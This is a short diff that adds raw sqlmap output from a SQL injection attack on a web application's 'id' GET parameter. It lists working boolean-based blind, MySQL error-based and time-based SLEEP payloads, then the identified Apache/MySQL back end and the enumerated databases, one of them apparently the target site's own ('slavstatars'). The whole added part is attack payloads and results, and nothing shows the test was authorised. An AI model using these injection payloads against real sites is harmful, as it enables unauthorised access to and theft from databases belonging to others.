@@ -61,3 +61,24 @@ available databases [2]:
 [*] information_schema
 [*] slavstatars
 
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=25 AND 4657=4657
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=25 AND (SELECT 9056 FROM(SELECT COUNT(*),CONCAT(0x71717a7071,(SELECT (ELT(9056=9056,1))),0x71766b6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: id=25 OR SLEEP(5)
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] information_schema
+[*] slavstatars
+
